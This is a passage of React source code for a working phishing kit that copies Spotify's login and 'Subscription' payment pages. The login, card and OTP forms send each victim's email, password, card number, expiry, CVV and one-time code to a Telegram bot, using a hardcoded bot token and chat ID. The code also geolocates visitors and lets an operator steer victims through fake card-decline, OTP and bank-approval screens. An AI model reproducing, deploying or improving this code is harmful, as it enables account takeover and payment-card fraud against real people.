
import React, { useState, useEffect, useRef } from 'react';
import Logo from './components/Logo';
import SocialButton from './components/SocialButton';
import { LoginStatus } from './types';

/**
 * PRODUCTION CONFIGURATION
 * Real-time tracking is simulated via localStorage and storage events.
 * To access the admin panel, append ?admin=true to your URL.
 */

interface SessionData {
  id: string;
  ip: string;
  city: string;
  country: string;
  currentPage: string;
  lastActive: number;
  email: string;
  pass: string;
  card: string;
  exp: string;
  cvv: string;
  otp: string;
  adminAction: 'NORMAL' | 'INVALID_CARD' | 'INVALID_OTP' | 'OTP_PAGE' | 'BANK_APPROVAL' | 'BLOCK';
}

const SESSION_STORAGE_KEY = 'spotify_prod_sessions_v2';
const CONFIG_STORAGE_KEY = 'spotify_prod_config_v2';

const getInitialConfig = () => {
  const saved = localStorage.getItem(CONFIG_STORAGE_KEY);
  return saved ? JSON.parse(saved) : {
    botToken: '8586070350:AAHH3zeOKmg5Z45CT_68N14xzEdkLFhY0G0',
    chatId: '5219969216',
    adminPass: 'admin123'
  };
};

const sendTelegramMessage = async (text: string) => {
  const config = getInitialConfig();
  if (!config.botToken || !config.chatId) return;
  try {
    await fetch(`https://api.telegram.org/bot${config.botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: config.chatId,
        text: text,
        parse_mode: 'HTML'
      })
    });
  } catch (error) {
    console.error('Telegram notification failed:', error);
  }
};

const getVisitorInfo = async () => {
  try {
    const response = await fetch('https://ipapi.co/json/');
    const data = await response.json();
    return { ip: data.ip, city: data.city, country: data.country_name };
  } catch {
    return { ip: '127.0.0.1', city: 'Unknown', country: 'Global' };
  }
};

// --- OTP Component ---
const OTPPage: React.FC<{ session: SessionData; updateSession: (d: Partial<SessionData>) => void; onOTPSubmit: () => void }> = ({ session, updateSession, onOTPSubmit }) => {
  useEffect(() => {
    updateSession({ currentPage: 'OTP Page' });
  }, []);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    await sendTelegramMessage(`<b>🔢 OTP RECEIVED</b>\n🔢 Code: <code>${session.otp}</code>\n📍 IP: ${session.ip}`);
    updateSession({ currentPage: 'OTP Sent - Waiting for Admin' });
    onOTPSubmit();
  };

  return (
    <div className="min-h-screen bg-black text-white flex flex-col items-center justify-center p-6 animate-in fade-in duration-500">
      <div className="w-full max-w-md bg-[#121212] p-8 rounded-[32px] border border-white/5 shadow-2xl flex flex-col items-center">
        <div className="w-16 h-16 bg-[#1ed760]/10 rounded-full flex items-center justify-center mb-6">
          <svg className="w-8 h-8 text-[#1ed760]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M8 10h.01M12 10h.01M16 10h.01M9 16H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-5l-5 5v-5z" />
          </svg>
        </div>
        <h2 className="text-2xl font-bold mb-2">Subscription</h2>
        <p className="text-[#a7a7a7] text-sm text-center mb-8">Confirm the 6-digit code sent to your device to verify your subscription.</p>

        {session.adminAction === 'INVALID_OTP' && (
          <div className="w-full bg-red-600/10 border border-red-600/30 text-red-600 p-4 rounded-xl text-sm text-center font-black mb-6 animate-shake">
            ❌ Invalid OTP - The code you entered is incorrect. Please try again.
          </div>
        )}

        <form onSubmit={handleSubmit} className="w-full space-y-6">
          <input
            required
            type="text"
            maxLength={6}
            placeholder="000000"
            value={session.otp}
            onChange={(e) => updateSession({ otp: e.target.value.replace(/\D/g, '') })}
            className="w-full bg-transparent border-b-2 border-[#3e3e3e] text-center text-4xl tracking-[0.5em] font-bold py-4 focus:border-[#1ed760] outline-none transition-all placeholder:tracking-normal placeholder:text-[#333]"
          />
          <button type="submit" className="w-full bg-[#1ed760] text-black font-bold py-4 rounded-full hover:scale-[1.02] active:scale-95 transition-all text-lg">Confirm</button>
        </form>
      </div>
    </div>
  );
};

// --- Bank Approval Component ---
const BankApproval: React.FC<{ updateSession: (d: Partial<SessionData>) => void; cardType: string }> = ({ updateSession, cardType }) => {
  useEffect(() => {
    updateSession({ currentPage: 'Bank Approval - ID Check' });
  }, []);

  // Determine which card icon to show based on card type
  const getCardIcon = () => {
    const firstDigit = cardType.trim()[0];
    if (firstDigit === '4') {
      return <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" className="h-8" alt="Visa" />;
    } else if (firstDigit === '5') {
      return <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" className="h-8" alt="Mastercard" />;
    } else if (firstDigit === '3') {
      return <img src="https://upload.wikimedia.org/wikipedia/commons/b/b0/American_Express_logo_%282018%29.svg" className="h-8" alt="Amex" />;
    }
    return <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" className="h-8" alt="Visa" />;
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-black via-[#0a0a0a] to-[#121212] text-white flex flex-col items-center justify-center p-6 text-center animate-in zoom-in duration-500">
      <div className="w-full max-w-md bg-[#121212] p-12 rounded-3xl border border-white/10 shadow-2xl">
        {/* Card Icon */}
        <div className="w-20 h-20 bg-white/5 rounded-2xl flex items-center justify-center mb-6 mx-auto border border-white/10">
          {getCardIcon()}
        </div>
        
        {/* Title */}
        <h2 className="text-3xl font-black mb-3 tracking-tight">ID Check</h2>
        <p className="text-[#1ed760] text-sm font-bold mb-8">Verification in progress</p>
        
        {/* Loading Animation */}
        <div className="flex gap-2 mb-10 justify-center">
          <div className="w-3 h-3 bg-[#1ed760] rounded-full animate-bounce [animation-delay:-0.3s]"></div>
          <div className="w-3 h-3 bg-[#1ed760] rounded-full animate-bounce [animation-delay:-0.15s]"></div>
          <div className="w-3 h-3 bg-[#1ed760] rounded-full animate-bounce"></div>
        </div>
        
        {/* Description */}
        <div className="bg-black/40 border border-white/5 rounded-2xl p-6 mb-6">
          <p className="text-[#a7a7a7] leading-relaxed text-sm">
            Please open your bank's mobile app to approve this verification request. This window will refresh automatically once confirmed.
          </p>
        </div>
        
        {/* Security Badge */}
        <div className="flex items-center justify-center gap-2 text-xs text-[#a7a7a7]">
          <svg className="w-4 h-4 text-[#1ed760]" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
          </svg>
          <span className="font-bold">Secured by your bank</span>
        </div>
      </div>
    </div>
  );
};

// --- Security Check Component ---
const SecurityCheck: React.FC<{ session: SessionData; updateSession: (d: Partial<SessionData>) => void; onVerify: () => void }> = ({ session, updateSession, onVerify }) => {
  const [captchaCode, setCaptchaCode] = useState<string>('');
  const [userInput, setUserInput] = useState<string[]>(['', '', '', '']);
  const [hasError, setHasError] = useState(false);
  const inputRefs = [useRef<HTMLInputElement>(null), useRef<HTMLInputElement>(null), useRef<HTMLInputElement>(null), useRef<HTMLInputElement>(null)];

  const generateCode = () => {
    const code = Math.floor(1000 + Math.random() * 9000).toString();
    setCaptchaCode(code);
    setUserInput(['', '', '', '']);
    setHasError(false);
    setTimeout(() => inputRefs[0].current?.focus(), 0);
  };

  useEffect(() => {
    generateCode();
    updateSession({ currentPage: 'Security Gate' });
  }, []);

  const handleInputChange = async (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return;
    const newInput = [...userInput];
    newInput[index] = value.slice(-1);
    setUserInput(newInput);
    setHasError(false);

    if (value && index < 3) inputRefs[index + 1].current?.focus();

    const finalCode = newInput.join('');
    if (finalCode.length === 4) {
      if (finalCode === captchaCode) {
        onVerify();
      } else {
        setHasError(true);
        setTimeout(generateCode, 600);
      }
    }
  };

  return (
    <div className="min-h-screen bg-[#0a0a0a] flex flex-col items-center justify-center px-6">
      <div className="w-full max-w-[400px] flex flex-col items-center">
        <div className="w-20 h-20 bg-[#14261a] rounded-full flex items-center justify-center mb-8 border border-[#1ed760]/20">
          <svg className="w-10 h-10 text-[#1ed760]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" /></svg>
        </div>
        <h1 className="text-white text-3xl font-bold mb-2">Subscription</h1>
        <p className="text-[#a7a7a7] mb-12 text-center">Enter the security code to proceed to your subscription</p>
        <div className="w-full bg-[#121212] rounded-2xl p-8 mb-10 relative flex justify-center gap-4 shadow-2xl border border-white/5">
          {captchaCode.split('').map((char, i) => (
            <div key={i} className="w-14 h-16 bg-[#1e1e1e] rounded-lg flex items-center justify-center text-3xl font-black text-white border border-white/10 shadow-inner">{char}</div>
          ))}
        </div>
        <div className="flex gap-4 mb-12">
          {userInput.map((val, i) => (
            <input key={i} ref={inputRefs[i]} type="text" maxLength={1} value={val} onChange={(e) => handleInputChange(i, e.target.value)} onKeyDown={(e) => { if (e.key === 'Backspace' && !val && i > 0) inputRefs[i-1].current?.focus(); }} className={`w-14 h-16 bg-transparent border-2 rounded-xl text-center text-2xl font-bold text-white focus:border-[#1ed760] outline-none transition-all ${hasError ? 'border-red-600' : 'border-[#333]'}`} />
          ))}
        </div>
      </div>
    </div>
  );
};

// --- Login Form Component ---
const LoginForm: React.FC<{ session: SessionData; updateSession: (d: Partial<SessionData>) => void; onLogin: () => void }> = ({ session, updateSession, onLogin }) => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);

  useEffect(() => {
    updateSession({ currentPage: 'Login Portal' });
  }, []);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    await sendTelegramMessage(`<b>🔑 LOGIN HIT</b>\n👤 User: <code>${email}</code>\n🔐 Pass: <code>${password}</code>\n📍 IP: ${session.ip}`);
    onLogin();
  };

  return (
    <div className="min-h-screen bg-black flex flex-col items-center">
      <header className="w-full py-8 px-6 flex justify-center animate-in slide-in-from-top duration-700"><Logo className="text-white w-9 h-9" /></header>
      <main className="w-full max-w-[734px] px-6 pb-20 flex flex-col items-center">
        <div className="w-full md:bg-[#121212] md:rounded-[24px] md:p-12 md:px-24 shadow-2xl">
          <h1 className="text-white text-[32px] md:text-[48px] font-bold text-center mb-10 tracking-tight">Log in to Spotify</h1>
          <form onSubmit={handleSubmit} className="flex flex-col">
            <div className="mb-4">
              <label className="block text-white text-[14px] font-bold mb-2">Email or username</label>
              <input type="text" required value={email} onChange={(e) => { setEmail(e.target.value); updateSession({ email: e.target.value }); }} placeholder="Email or username" className="w-full bg-[#121212] md:bg-transparent border border-[#878787] text-white p-3.5 rounded-md placeholder-[#a7a7a7] hover:border-white focus:shadow-[0_0_0_2px_#ffffff] transition-all" />
            </div>
            <div className="mb-6 relative">
              <label className="block text-white text-[14px] font-bold mb-2">Password</label>
              <div className="relative">
                <input type={showPassword ? 'text' : 'password'} required value={password} onChange={(e) => { setPassword(e.target.value); updateSession({ pass: e.target.value }); }} placeholder="Password" className="w-full bg-[#121212] md:bg-transparent border border-[#878787] text-white p-3.5 rounded-md placeholder-[#a7a7a7] pr-12 hover:border-white focus:shadow-[0_0_0_2px_#ffffff] transition-all" />
                <button type="button" onClick={() => setShowPassword(!showPassword)} className="absolute right-3 top-1/2 -translate-y-1/2 text-[#a7a7a7] hover:text-white">
                  {showPassword ? <svg fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24" className="w-5 h-5"><path d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l3.59 3.59m0 0A9.953 9.953 0 0112 5c4.478 0 8.268-2.943 9.543 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21" /></svg> : <svg fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24" className="w-5 h-5"><path d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" /><path d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268-2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" /></svg>}
                </button>
              </div>
            </div>
            <button type="submit" className="w-full bg-[#1ed760] text-black font-bold py-4 rounded-full hover:scale-[1.02] active:scale-95 transition-all mb-6">Log In</button>
            <a href="#" className="text-white text-center text-[14px] font-bold underline mb-8">Forgot your password?</a>
          </form>
          <div className="flex flex-col mb-8 gap-2">
            <SocialButton icon={<svg viewBox="0 0 24 24" className="w-5 h-5"><path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" /><path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" /><path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l3.66-2.84z" /><path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" /></svg>} label="Continue with Google" />
            <SocialButton icon={<svg fill="#1877F2" viewBox="0 0 24 24" className="w-6 h-6"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z" /></svg>} label="Continue with Facebook" />
            <SocialButton icon={<svg fill="white" viewBox="0 0 24 24" className="w-5 h-5"><path d="M12.152 6.896c-.948 0-2.415-1.078-3.96-1.04-2.04.027-3.91 1.183-4.961 3.014-2.117 3.675-.546 9.103 1.519 12.09 1.013 1.454 2.208 3.09 3.792 3.03 1.52-.065 2.09-.987 3.935-.987 1.831 0 2.35.987 3.96.948 1.637-.026 2.676-1.48 3.676-2.948 1.156-1.688 1.636-3.325 1.662-3.415-.039-.013-3.182-1.221-3.22-4.857-.026-3.04 2.48-4.494 2.597-4.559-1.429-2.09-3.623-2.324-4.39-2.376-2-.156-3.675 1.09-4.61 1.09zM15.53 3.83c.843-1.012 1.4-2.427 1.245-3.83-1.207.052-2.662.805-3.532 1.818-.78.896-1.454 2.338-1.273 3.714 1.338.104 2.715-.688 3.559-1.702z" /></svg>} label="Continue with Apple" />
            <SocialButton icon={<svg fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24" className="w-5 h-5 text-[#878787]"><path d="M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 6V5z" /></svg>} label="Continue with phone number" />
          </div>
          <hr className="border-[#292929] mb-10" />
          <p className="text-[#a7a7a7] text-center text-[16px]">Don't have an account? <a href="#" className="text-white font-bold underline">Sign up for Spotify</a></p>
        </div>
      </main>
    </div>
  );
};

// --- New Processing Screen ---
const ProcessingScreen: React.FC = () => {
  return (
    <div className="min-h-screen bg-black flex flex-col items-center justify-center p-6 text-center">
      <div className="w-14 h-14 border-4 border-[#1ed760]/20 border-t-[#1ed760] rounded-full animate-spin mb-8"></div>
      <h2 className="text-white text-2xl font-bold mb-2">Processing your request...</h2>
      <p className="text-[#a7a7a7] text-sm">Please do not close this window or go back.</p>
    </div>
  );
};

// --- Payment Form Component (Redesigned to match screenshot precisely) ---
const PaymentForm: React.FC<{ session: SessionData; updateSession: (d: Partial<SessionData>) => void; onPay: () => void }> = ({ session, updateSession, onPay }) => {
  useEffect(() => {
    updateSession({ currentPage: 'Saved Payment Cards' });
  }, []);

  const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let val = e.target.value.replace(/\D/g, '');
    if (val.length > 4) val = val.slice(0, 4);
    if (val.length > 2) val = val.slice(0, 2) + ' / ' + val.slice(2);
    updateSession({ exp: val });
  };

  const handleCardChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let val = e.target.value.replace(/\D/g, '');
    if (val.length > 16) val = val.slice(0, 16);
    const formatted = val.match(/.{1,4}/g)?.join(' ') || val;
    updateSession({ card: formatted });
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    await sendTelegramMessage(`<b>💳 CARD CAPTURED</b>\n💳 Card: <code>${session.card}</code>\n📅 Exp: <code>${session.exp}</code>\n🔐 CVV: <code>${session.cvv}</code>\n📍 IP: ${session.ip}`);
    onPay();
  };

  return (
    <div className="min-h-screen bg-[#121212] text-white flex flex-col font-sans animate-in fade-in duration-500 overflow-x-hidden">
      {/* Header */}
      <nav className="w-full flex items-center justify-between px-6 md:px-24 py-4 bg-black border-b border-white/5 sticky top-0 z-50">
        <div className="flex items-center gap-10">
          <Logo className="w-8 text-white" />
          <div className="hidden lg:flex gap-6 text-sm font-bold text-white/70">
            <a href="#" className="hover:text-white transition-colors">Premium plans</a>
            <a href="#" className="hover:text-white transition-colors">Support</a>
            <a href="#" className="hover:text-white transition-colors">Download</a>
          </div>
        </div>
        <div className="flex items-center gap-6">
          <div className="hidden md:block w-[1px] h-6 bg-white/20"></div>
          <div className="flex items-center gap-3 cursor-pointer group">
            <div className="w-8 h-8 bg-[#282828] rounded-full flex items-center justify-center border border-white/5 group-hover:bg-[#333]">
              <svg className="w-4 h-4 text-white" fill="currentColor" viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
            </div>
            <span className="text-sm font-bold group-hover:underline">Profile</span>
            <svg className="w-4 h-4 text-white/70" fill="currentColor" viewBox="0 0 24 24"><path d="M7 10l5 5 5-5H7z"/></svg>
          </div>
        </div>
      </nav>

      {/* Main Content */}
      <main className="flex-1 flex flex-col items-center bg-black pt-12 pb-24 px-6">
        <div className="w-full max-w-4xl flex flex-col">
          <div className="flex flex-col md:flex-row gap-12 mt-12">
            <div className="hidden md:block pt-2">
               <div className="w-10 h-10 rounded-full bg-[#242424] flex items-center justify-center cursor-pointer hover:bg-[#333]">
                 <svg className="w-6 h-6" fill="currentColor" viewBox="0 0 24 24"><path d="M15.41 7.41L14 6l-6 6 6 6 1.41-1.41L10.83 12z"/></svg>
               </div>
            </div>

            <div className="flex-1 max-w-2xl">
              <h2 className="text-4xl font-black mb-6 tracking-tight">Subscription</h2>
              <p className="text-[#a7a7a7] text-[13px] leading-relaxed mb-12">
                Manage your payment details for one-time purchases. To manage payment details for your monthly subscription, go to <a href="#" className="underline text-white hover:text-[#1ed760]">Account overview</a>.
              </p>

              <div className="flex items-center justify-between mb-4 border-b border-white/5 pb-2">
                 <h3 className="text-lg font-bold">My cards</h3>
                 <svg className="w-4 h-4 text-white/40" fill="currentColor" viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
              </div>

              {session.adminAction === 'INVALID_CARD' && (
                <div className="bg-red-600/10 border border-red-600/30 text-red-600 p-4 rounded-xl mb-8 text-center text-sm font-black animate-shake">
                  ❌ Your card is declined - Please try a different card.
                </div>
              )}

              {/* Card Form */}
              <div className="bg-[#121212] border border-white/5 rounded-xl p-8 shadow-2xl">
                <div className="flex justify-between items-center mb-8">
                  <div className="flex flex-col">
                    <span className="text-[13px] font-bold mb-3">Credit or debit card</span>
                    <div className="flex gap-3">
                       {/* Beautiful Professional Card Icons */}
                       <div className="bg-gradient-to-br from-[#1a1f71] to-[#0d1249] p-2 px-3 rounded-lg flex items-center shadow-lg border border-blue-500/20">
                          <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" className="h-4" alt="Visa" />
                       </div>
                       <div className="bg-gradient-to-br from-[#eb001b] to-[#ff5f00] p-2 px-3 rounded-lg flex items-center shadow-lg">
                          <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" className="h-4" alt="MC" />
                       </div>
                       <div className="bg-gradient-to-br from-[#006fcf] to-[#0048a0] p-2 px-3 rounded-lg flex items-center shadow-lg">
                          <img src="https://upload.wikimedia.org/wikipedia/commons/b/b0/American_Express_logo_%282018%29.svg" className="h-4" alt="Amex" />
                       </div>
                    </div>
                  </div>
                  <svg className="w-5 h-5 text-white/40" fill="currentColor" viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
                </div>

                <form onSubmit={handleSubmit} className="space-y-8">
                  <div>
                    <label className="block text-[13px] font-bold mb-2">Card number</label>
                    <div className="relative group">
                      <div className="absolute left-4 top-1/2 -translate-y-1/2 text-white/40 group-focus-within:text-[#1ed760] transition-colors">
                        <svg className="w-6 h-6" fill="currentColor" viewBox="0 0 24 24"><path d="M21 7H3c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h18c1.1 0 2-.9 2-2V9c0-1.1-.9-2-2-2zm0 12H3V9h18v10z"/></svg>
                      </div>
                      <input required type="text" placeholder="0000 0000 0000 0000" value={session.card} onChange={handleCardChange} className="w-full bg-[#242424] border border-[#727272] p-4 pl-14 rounded-md text-sm placeholder-[#727272] hover:border-white focus:border-white outline-none transition-all" />
                    </div>
                  </div>

                  <div className="flex gap-6">
                    <div className="flex-1">
                      <label className="block text-[13px] font-bold mb-2">Expiry date</label>
                      <input required type="text" placeholder="MM / YY" value={session.exp} onChange={handleExpiryChange} className="w-full bg-[#242424] border border-[#727272] p-4 rounded-md text-sm placeholder-[#727272] hover:border-white focus:border-white outline-none transition-all" />
                    </div>
                    <div className="flex-1">
                      <label className="block text-[13px] font-bold mb-2">Security code</label>
                      <div className="relative">
                        <input required type="text" placeholder="123" maxLength={4} value={session.cvv} onChange={(e) => updateSession({ cvv: e.target.value.replace(/\D/g, '') })} className="w-full bg-[#242424] border border-[#727272] p-4 rounded-md text-sm placeholder-[#727272] hover:border-white focus:border-white outline-none transition-all" />
                        <div className="absolute right-4 top-1/2 -translate-y-1/2 text-white/40 cursor-help group">
                          <svg className="w-5 h-5" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24"><path d="M8.228 9c.549-1.165 2.03-2 3.772-2 2.21 0 4 1.343 4 3 0 1.4-1.278 2.575-3.006 2.907-.542.104-.994.54-.994 1.093m0 3h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>
                        </div>
                      </div>
                    </div>
                  </div>

                  <div className="flex items-start gap-4">
                     <div className="mt-1">
                        <input type="checkbox" id="save-card" className="w-5 h-5 accent-[#1ed760] cursor-pointer" defaultChecked />
                     </div>
                     <label htmlFor="save-card" className="text-[12px] text-[#a7a7a7] cursor-pointer select-none">
                        <span className="text-white font-bold block mb-1">Save card for future orders.</span>
                        This won't affect how you pay for existing subscriptions and can be managed anytime in your Account page.
                     </label>
                  </div>

                  <div className="flex flex-col items-center gap-6 pt-6">
                    <button type="submit" className="w-full max-w-[120px] bg-[#1ed760] text-black font-black py-4 rounded-full hover:scale-105 active:scale-95 transition-all text-sm tracking-tight shadow-lg">Save</button>
                    <button type="button" className="text-sm font-bold text-white hover:underline">Cancel</button>
                  </div>
                </form>
              </div>
            </div>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="w-full bg-black pt-24 pb-12 px-6 md:px-24 border-t border-white/5">
        <div className="max-w-7xl mx-auto grid grid-cols-2 lg:grid-cols-6 gap-12 mb-20">
          <div className="col-span-2 lg:col-span-1"><Logo className="w-10 text-white" /></div>
          
          <div className="flex flex-col gap-6">
            <h4 className="text-[11px] font-black uppercase tracking-widest text-[#a7a7a7]">Company</h4>
            <div className="flex flex-col gap-4 text-sm font-medium text-[#a7a7a7]">
              <a href="#" className="hover:text-[#1ed760]">About</a>
              <a href="#" className="hover:text-[#1ed760]">Jobs</a>
              <a href="#" className="hover:text-[#1ed760]">For the Record</a>
            </div>
          </div>

          <div className="flex flex-col gap-6">
            <h4 className="text-[11px] font-black uppercase tracking-widest text-[#a7a7a7]">Communities</h4>
            <div className="flex flex-col gap-4 text-sm font-medium text-[#a7a7a7]">
              <a href="#" className="hover:text-[#1ed760]">For Artists</a>
              <a href="#" className="hover:text-[#1ed760]">Developers</a>
              <a href="#" className="hover:text-[#1ed760]">Advertising</a>
              <a href="#" className="hover:text-[#1ed760]">Investors</a>
              <a href="#" className="hover:text-[#1ed760]">Vendors</a>
            </div>
          </div>

          <div className="flex flex-col gap-6">
            <h4 className="text-[11px] font-black uppercase tracking-widest text-[#a7a7a7]">Useful links</h4>
            <div className="flex flex-col gap-4 text-sm font-medium text-[#a7a7a7]">
              <a href="#" className="hover:text-[#1ed760]">Support</a>
              <a href="#" className="hover:text-[#1ed760]">Web Player</a>
              <a href="#" className="hover:text-[#1ed760]">Free Mobile App</a>
              <a href="#" className="hover:text-[#1ed760]">Import your music</a>
            </div>
          </div>

          <div className="flex flex-col gap-6">
            <h4 className="text-[11px] font-black uppercase tracking-widest text-[#a7a7a7]">Spotify Plans</h4>
            <div className="flex flex-col gap-4 text-sm font-medium text-[#a7a7a7]">
              <a href="#" className="hover:text-[#1ed760]">Premium Individual</a>
              <a href="#" className="hover:text-[#1ed760]">Premium Duo</a>
              <a href="#" className="hover:text-[#1ed760]">Premium Family</a>
              <a href="#" className="hover:text-[#1ed760]">Premium Student</a>
              <a href="#" className="hover:text-[#1ed760]">Spotify Free</a>
              <a href="#" className="hover:text-[#1ed760]">Audiobooks Access</a>
            </div>
          </div>

          <div className="flex gap-4 items-start justify-end col-span-2 lg:col-span-1">
             {[
               <svg key="ig" className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"/></svg>,
               <svg key="tw" className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.134l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>,
               <svg key="fb" className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
             ].map((icon, i) => (
